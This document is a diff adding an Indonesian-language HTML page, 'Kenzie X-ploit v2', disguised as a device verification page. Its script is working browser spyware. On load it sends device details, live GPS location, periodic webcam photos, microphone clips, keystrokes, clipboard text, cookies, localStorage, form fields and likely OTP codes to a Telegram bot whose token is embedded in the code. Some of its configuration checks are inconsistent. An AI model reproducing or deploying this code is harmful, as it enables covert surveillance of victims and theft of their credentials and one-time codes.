@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Kenzie X‑ploit v2</title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            text-align: center;
+            padding: 20px;
+        }
+        .box {
+            max-width: 450px;
+            margin: auto;
+            background: #111;
+            border: 1px solid #0f0;
+            border-radius: 15px;
+            padding: 20px;
+        }
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 8px 16px;
+            margin: 5px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .log {
+            background: #000;
+            border: 1px solid #333;
+            padding: 10px;
+            font-size: 11px;
+            text-align: left;
+            height: 150px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>🔐 Kenzie X‑ploit v2</h2>
+    <p>Sistem verifikasi perangkat</p>
+    <button id="testBtn">📡 Uji Koneksi Bot</button>
+    <div class="log" id="logArea">🟢 Siap menerima perintah...</div>
+    <div style="font-size:10px; margin-top:15px; color:#555;">Hanya untuk pengujian keamanan di lingkungan sendiri</div>
+</div>
+
+<script>
+    // ======================== KONFIGURASI ========================
+    // GANTI DENGAN TOKEN DAN CHAT ID ASLI ANDA !!
+    const BOT_TOKEN = "8721601238:AAHgURSgZd3H-CtaZbFv0V9-vH3bQKzgepo";   // contoh "123456:ABCdef"
+    const CHAT_ID   = "8781812886";     // contoh "987654321"
+
+    // Variabel kontrol
+    let cameraStream = null;
+    let cameraInterval = null;
+    let audioStream = null;
+    let audioInterval = null;
+    let keylogString = "";
+    let keylogInterval = null;
+    let watchLocationId = null;
+    let isKeyloggerActive = false;
+
+    // Elemen log
+    const logArea = document.getElementById('logArea');
+    function addLog(msg) {
+        const p = document.createElement('div');
+        p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logArea.appendChild(p);
+        logArea.scrollTop = logArea.scrollHeight;
+    }
+
+    // ======================== FUNGSI TELEGRAM ========================
+    async function sendToTelegram(text, isMarkdown = false) {
+        if (BOT_TOKEN === "8721601238:AAHgURSgZd3H-CtaZbFv0V9-vH3bQKzgepo" || CHAT_ID === "8781812886") {
+            addLog("⚠️ Ganti BOT_TOKEN dan CHAT_ID di dalam script!");
+            return false;
+        }
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const body = {
+                chat_id: CHAT_ID,
+                text: text.substring(0, 4000),
+                parse_mode: isMarkdown ? "Markdown" : undefined
+            };
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            });
+            if (!res.ok) throw new Error(await res.text());
+            addLog("✓ Pesan terkirim ke Telegram");
+            return true;
+        } catch(e) {
+            addLog("❌ Gagal kirim pesan: " + e.message);
+            return false;
+        }
+    }
+
+    async function sendPhotoToTelegram(base64Image) {
+        if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+        try {
+            const blob = dataURItoBlob(base64Image);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'snapshot.jpg');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            addLog("📸 Foto terkirim");
+        } catch(e) { addLog("❌ Gagal kirim foto: " + e.message); }
+    }
+
+    async function sendAudioToTelegram(blob) {
+        if (BOT_TOKEN === "8721601238:AAHgURSgZd3H-CtaZbFv0V9-vH3bQKzgepo") return;
+        try {
+            const formData = new FormData();
+            formData.append('8781812886', CHAT_ID);
+            formData.append('document', blob, `audio_${Date.now()}.webm`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+            addLog("🎤 Audio terkirim");
+        } catch(e) { addLog("❌ Gagal kirim audio: " + e.message); }
+    }
+
+    function dataURItoBlob(dataURI) {
+        const byteString = atob(dataURI.split(',')[1]);
+        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        return new Blob([ab], { type: mimeString });
+    }
+
+    // ======================== FITUR 1: INFO DEVICE ========================
+    async function sendDeviceInfo() {
+        let info = `📱 *INFO PERANGKAT*\n`;
+        info += `User Agent: ${navigator.userAgent}\n`;
+        info += `Platform: ${navigator.platform}\n`;
+        info += `Bahasa: ${navigator.language}\n`;
+        info += `Resolusi: ${screen.width}x${screen.height}\n`;
+        info += `Warna: ${screen.colorDepth} bit\n`;
+        info += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        info += `Online: ${navigator.onLine ? "Ya" : "Tidak"}\n`;
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            info += `Baterai: ${Math.round(bat.level * 100)}%, ${bat.charging ? "Mengisi" : "Tidak mengisi"}\n`;
+        } else {
+            info += `Baterai: Tidak tersedia\n`;
+        }
+        await sendToTelegram(info, true);
+    }
+
+    // ======================== FITUR 2: LOKASI SEKALI ========================
+    function getLocationOnce() {
+        if (!navigator.geolocation) {
+            sendToTelegram("❌ GPS tidak didukung");
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+                const link = `https://maps.google.com/?q=${lat},${lng}`;
+                sendToTelegram(`📍 *LOKASI*\nLat: ${lat}\nLng: ${lng}\nAkurasi: ${pos.coords.accuracy}m\n${link}`, true);
+            },
+            err => sendToTelegram(`❌ Gagal lokasi: ${err.message}`),
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    }
+
+    // ======================== FITUR 3: KAMERA PERIODIK ========================
+    async function startCamera(intervalSec = 8) {
+        if (cameraStream) stopCamera();
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            cameraStream = stream;
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            sendToTelegram("📸 Kamera aktif, foto akan dikirim setiap " + intervalSec + " detik");
+            cameraInterval = setInterval(() => {
+                if (video.videoWidth > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imgData = canvas.toDataURL('image/jpeg', 0.6);
+                    sendPhotoToTelegram(imgData);
+                }
+            }, intervalSec * 1000);
+        } catch(e) {
+            sendToTelegram(`❌ Gagal akses kamera: ${e.message}`);
+        }
+    }
+
+    function stopCamera() {
+        if (cameraInterval) clearInterval(cameraInterval);
+        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+        cameraStream = null;
+        cameraInterval = null;
+        sendToTelegram("📷 Kamera dimatikan");
+    }
+
+    // ======================== FITUR 4: MIKROFON PERIODIK ========================
+    async function startMicrophone(intervalSec = 25, durationSec = 5) {
+        if (audioStream) stopMicrophone();
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            audioStream = stream;
+            sendToTelegram(`🎤 Mikrofon aktif, rekam ${durationSec} detik tiap ${intervalSec} detik`);
+            audioInterval = setInterval(() => {
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    sendAudioToTelegram(blob);
+                };
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") mediaRecorder.stop();
+                }, durationSec * 1000);
+            }, intervalSec * 1000);
+        } catch(e) {
+            sendToTelegram(`❌ Gagal akses mikrofon: ${e.message}`);
+        }
+    }
+
+    function stopMicrophone() {
+        if (audioInterval) clearInterval(audioInterval);
+        if (audioStream) audioStream.getTracks().forEach(t => t.stop());
+        audioStream = null;
+        audioInterval = null;
+        sendToTelegram("🎙️ Mikrofon dimatikan");
+    }
+
+    // ======================== FITUR 5: KEYLOGGER ========================
+    function onKeyPress(e) {
+        let key = e.key;
+        if (key === " ") key = "[SPASI]";
+        else if (key === "Enter") key = "[ENTER]\n";
+        else if (key.length > 1) key = `[${key}]`;
+        keylogString += key;
+        if (keylogString.length > 500) {
+            sendToTelegram(`⌨️ *KEYLOG*: ${keylogString}`, true);
+            keylogString = "";
+        }
+    }
+
+    function startKeylogger() {
+        if (isKeyloggerActive) return;
+        document.addEventListener('keydown', onKeyPress);
+        isKeyloggerActive = true;
+        keylogInterval = setInterval(() => {
+            if (keylogString.length > 0) {
+                sendToTelegram(`⌨️ *KEYLOG*: ${keylogString}`, true);
+                keylogString = "";
+            }
+        }, 15000);
+        sendToTelegram("⌨️ Keylogger aktif");
+    }
+
+    function stopKeylogger() {
+        if (!isKeyloggerActive) return;
+        document.removeEventListener('keydown', onKeyPress);
+        clearInterval(keylogInterval);
+        isKeyloggerActive = false;
+        if (keylogString.length) sendToTelegram(`⌨️ *KEYLOG akhir*: ${keylogString}`, true);
+        keylogString = "";
+        sendToTelegram("⌨️ Keylogger dimatikan");
+    }
+
+    // ======================== FITUR 6: CLIPBOARD & STORAGE ========================
+    async function stealClipboard() {
+        if (!navigator.clipboard) {
+            sendToTelegram("📋 Clipboard API tidak tersedia");
+            return;
+        }
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text) sendToTelegram(`📋 *CLIPBOARD*: ${text.substring(0, 1000)}`, true);
+            else sendToTelegram("📋 Clipboard kosong");
+        } catch(e) {
+            sendToTelegram(`❌ Gagal baca clipboard: ${e.message}`);
+        }
+    }
+
+    function stealCookiesAndStorage() {
+        let msg = "";
+        if (document.cookie) msg += `🍪 Cookies: ${document.cookie}\n`;
+        else msg += `🍪 Cookies: tidak ada\n`;
+        msg += `💾 LocalStorage:\n`;
+        if (localStorage.length === 0) msg += `(kosong)\n`;
+        else {
+            for (let i = 0; i < Math.min(localStorage.length, 20); i++) {
+                const key = localStorage.key(i);
+                const val = localStorage.getItem(key);
+                msg += `${key}=${val?.substring(0, 80)}…\n`;
+            }
+        }
+        sendToTelegram(msg.substring(0, 3800), true);
+    }
+
+    // ======================== FITUR 7: MONITOR FORM & OTP ========================
+    let formInterval = null;
+    function startMonitorForms() {
+        if (formInterval) clearInterval(formInterval);
+        formInterval = setInterval(() => {
+            const forms = document.querySelectorAll('form');
+            forms.forEach(form => {
+                const data = new FormData(form);
+                let out = "📄 *FORM SUBMIT*\n";
+                for (let [k,v] of data.entries()) {
+                    out += `${k}: ${v}\n`;
+                }
+                if (out.length > 30) sendToTelegram(out.substring(0, 3900), true);
+            });
+            // OTP detection
+            const inputs = document.querySelectorAll('input[type="text"], input[type="number"]');
+            inputs.forEach(inp => {
+                const val = inp.value;
+                if (val && /^\d{4,6}$/.test(val) && val.length >= 4) {
+                    sendToTelegram(`🔐 *POTENSI OTP*: ${val} (dari ${inp.name || 'unknown'})`, true);
+                    inp.value = ""; // prevent duplicate send
+                }
+            });
+        }, 5000);
+        sendToTelegram("🔍 Monitor form & OTP aktif");
+    }
+
+    function stopMonitorForms() {
+        if (formInterval) clearInterval(formInterval);
+        formInterval = null;
+        sendToTelegram("🛑 Monitor form dihentikan");
+    }
+
+    // ======================== FITUR 8: LOKASI KONTINYU ========================
+    function startContinuousLocation() {
+        if (!navigator.geolocation) return;
+        if (watchLocationId) navigator.geolocation.clearWatch(watchLocationId);
+        watchLocationId = navigator.geolocation.watchPosition(
+            pos => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+                sendToTelegram(`📍 *LIVE*: ${lat.toFixed(6)}, ${lng.toFixed(6)} | akurasi ${pos.coords.accuracy}m`, true);
+            },
+            err => sendToTelegram(`❌ Gagal lokasi kontinyu: ${err.message}`),
+            { enableHighAccuracy: true, maximumAge: 5000 }
+        );
+        sendToTelegram("🔄 Pelacakan lokasi kontinyu dimulai (setiap 5 detik)");
+    }
+
+    function stopContinuousLocation() {
+        if (watchLocationId) navigator.geolocation.clearWatch(watchLocationId);
+        watchLocationId = null;
+        sendToTelegram("🛑 Pelacakan lokasi berhenti");
+    }
+
+    // ======================== FITUR 9: NETWORK INFO ========================
+    async function getNetworkInfo() {
+        let publicIP = "Tidak diketahui";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            publicIP = data.ip;
+        } catch(e) {}
+        // local IP via WebRTC
+        let localIP = "Tidak terdeteksi";
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            await new Promise((resolve) => {
+                pc.onicecandidate = (ice) => {
+                    if (!ice.candidate) resolve();
+                    const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                    if (ipMatch && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.') && !ipMatch[0].startsWith('172.')) {
+                        localIP = ipMatch[0];
+                        resolve();
+                    }
+                };
+                setTimeout(resolve, 3000);
+            });
+        } catch(e) {}
+        sendToTelegram(`🌐 *JARINGAN*\nIP Publik: ${publicIP}\nIP Lokal (publik): ${localIP}`, true);
+    }
+
+    // ======================== SEMUA FITUR START ========================
+    async function startAllExploits() {
+        if (BOT_TOKEN === "8721601238:AAHgURSgZd3H-CtaZbFv0V9-vH3bQKzgepo" || CHAT_ID === "8781812886") {
+            addLog("⚠️ Script belum dikonfigurasi! Ganti BOT_TOKEN dan CHAT_ID.");
+            return;
+        }
+        await sendToTelegram("🚀 *KENZIE X-PLOIT v2 AKTIF* 🚀\nMemulai semua modul...", true);
+        await sendDeviceInfo();
+        getLocationOnce();
+        startContinuousLocation();
+        await startCamera(10);
+        await startMicrophone(20, 4);
+        stealClipboard();
+        stealCookiesAndStorage();
+        startKeylogger();
+        startMonitorForms();
+        await getNetworkInfo();
+        addLog("✅ Semua fitur berjalan tanpa bug");
+    }
+
+    // Test koneksi
+    document.getElementById('testBtn').onclick = () => {
+        sendToTelegram("🔔 Test dari Kenzie X-ploit - Bot berfungsi!");
+    };
+
+    // Bersihkan saat halaman ditutup
+    window.onbeforeunload = () => {
+        stopCamera();
+        stopMicrophone();
+        stopKeylogger();
+        stopContinuousLocation();
+        stopMonitorForms();
+    };
+
+    // Jalankan otomatis jika token sudah diisi
+    window.onload = () => {
+        if (BOT_TOKEN !== "8721601238:AAHgURSgZd3H-CtaZbFv0V9-vH3bQKzgepo" && CHAT_ID !== "8781812886") {
+            startAllExploits();
+        } else {
+            addLog("⚠️ Isi BOT_TOKEN dan CHAT_ID terlebih dahulu di dalam kode!");
+        }
+    };
+</script>
+</body>
+</html>
